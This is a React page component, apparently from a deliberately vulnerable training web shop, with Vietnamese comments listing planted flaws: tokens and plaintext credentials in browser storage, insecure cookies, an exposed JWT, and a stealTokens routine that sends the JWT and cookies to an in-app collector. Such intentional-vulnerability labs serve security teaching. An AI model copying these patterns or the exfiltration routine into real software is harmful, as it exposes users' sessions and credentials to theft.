import React, { useEffect, useState } from "react";
import { LS, SS, setInsecureCookie, readAllCookies, exfiltrate } from "../vuln/clientStorage.js";

/* Thiết bị & phiên đăng nhập.
   [VULN #21/#22] localStorage/sessionStorage để token + plaintext creds
   [VULN #23] cookie client-side không HttpOnly/Secure/SameSite
   [VULN #24] JWT hiển thị + lưu localStorage
   [VULN #25] token theft: exfil tới collector, attacker view GET /api/telemetry
   [VULN #26] session hijack: copy cookie dùng từ máy khác */
export default function Sessions() {
  const [dump, setDump] = useState({});
  const [telemetry, setTelemetry] = useState("");
  const [ckName, setCkName] = useState("pcforge_prefs");
  const [ckVal, setCkVal] = useState("theme=dark");

  async function refresh() {
    setDump({
      localStorage: LS.all(),
      sessionStorage: SS.all(),
      cookies: readAllCookies(),
      windowGlobals: (window.VULN_CONFIG && "VULN_CONFIG có API keys") || null,
    });
  }
  useEffect(() => {
    refresh();
  }, []);

  async function stealTokens() {
    await exfiltrate({
      src: "sessions-page",
      kind: "manual-exfil",
      jwt: LS.get("vulnshop_jwt"),
      cookies: readAllCookies(),
      localStorageKeys: Object.keys(LS.all()),
    });
    setTelemetry(JSON.stringify(await fetch("/api/telemetry").then((x) => x.json()), null, 2).slice(0, 8000));
    refresh();
  }

  return (
    <div>
      <h1>🖥 Thiết bị & phiên đăng nhập</h1>

      <div className="card">
        <h3>Thông tin phiên trên thiết bị này</h3>
        <button onClick={refresh}>Refresh</button>
        <pre>{JSON.stringify(dump, null, 2)}</pre>
      </div>

      <div className="card">
        <h3>Đăng xuất từ xa</h3>
        <p className="hint">Tính năng đang được phát triển — liên hệ hotline 1900-1988 để khoá phiên từ xa.</p>
      </div>
    </div>
  );
}
